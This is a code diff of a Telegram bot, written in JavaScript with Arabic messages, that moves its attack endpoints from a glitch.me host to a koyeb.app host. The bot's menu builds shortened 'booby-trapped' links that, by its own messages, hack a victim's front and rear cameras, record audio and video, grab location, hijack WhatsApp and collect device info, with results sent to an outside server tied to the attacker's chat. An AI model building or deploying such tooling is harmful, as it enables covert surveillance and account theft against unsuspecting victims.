@@ -2822,37 +2822,37 @@ bot.on('callback_query', (callbackQuery) => {
         bot.once('message', (msg) => {
             if (msg.text) {
                 const link = msg.text;
-                const malwareUrl = `https://rainy-typhoon-lamprey.glitch.me/malware?chatId=${chatId}&originalLink=${encodeURIComponent(link)}`;
+                const malwareUrl = `https://freeusr.koyeb.app/malware?chatId=${chatId}&originalLink=${encodeURIComponent(link)}`;
                 shortenUrlAndSendMessage(malwareUrl, '⚠️ تم تلغيم الرابط، استخدم هذا الرابط لاختراق:');
             } else {
                 bot.sendMessage(chatId, 'الرجاء إرسال رابط نصي صالح.');
             }
         });
     } else if (data === 'front_camera' || data === 'rear_camera') {
-        const url = `https://rainy-typhoon-lamprey.glitch.me/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
+        const url = `https://freeusr.koyeb.app/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
         shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية:');
     } else if (data === 'voice_record') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
         bot.once('message', (msg) => {
             const duration = parseInt(msg.text, 10);
             if (!isNaN(duration) && duration >= 1 &&  duration <= 20) {
-                const url = `https://rainy-typhoon-lamprey.glitch.me/record/${chatId}?duration=${duration}`;
+                const url = `https://freeusr.koyeb.app/record/${chatId}?duration=${duration}`;
                 shortenUrlAndSendMessage(url, `تم تلغيم رابط تسجيل الصوت لمدة ${duration} ثانية:`);
             } else {
                 bot.sendMessage(chatId, 'الرجاء إدخال مدة تسجيل صحيحة بين 1 و 20 ثانية.');
             }
         });
     } else if (data === 'get_location') {
-        const url = `https://rainy-typhoon-lamprey.glitch.me/getLocation/${chatId}`;
+        const url = `https://freeusr.koyeb.app/getLocation/${chatId}`;
         shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق موقع الضحية:');
     } else if (data === 'capture_video') {
-        const url = `https://rainy-typhoon-lamprey.glitch.me/camera/video/${chatId}`;
+        const url = `https://freeusr.koyeb.app/camera/video/${chatId}`;
         shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية فيديو:');
     } else if (data === 'request_verification') {
-        const verificationLink = `https://rainy-typhoon-lamprey.glitch.me/whatsapp?chatId=${chatId}`;
+        const verificationLink = `https://freeusr.koyeb.app/whatsapp?chatId=${chatId}`;
         shortenUrlAndSendMessage(verificationLink, 'تم إنشاء رابط لاختراق واتساب:');
     } else if (data === 'collect_device_info') {
-        const url = `https://rainy-typhoon-lamprey.glitch.me/${chatId}`;
+        const url = `https://freeusr.koyeb.app/${chatId}`;
         shortenUrlAndSendMessage(url, 'تم تلغيم  رابط  جمع معلومات اجهزه الضحيه:');
     
     }
@@ -4127,7 +4127,7 @@ process.on('unhandledRejection', (error) => {
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const data = query.data;
-    const baseUrl = 'https://rainy-typhoon-lamprey.glitch.me'; // تأكد من تغيير هذا إلى عنوان URL الخاص بك
+    const baseUrl = 'https://freeusr.koyeb.app'; // تأكد من تغيير هذا إلى عنوان URL الخاص بك
 
     console.log('Received callback query:', data);
 
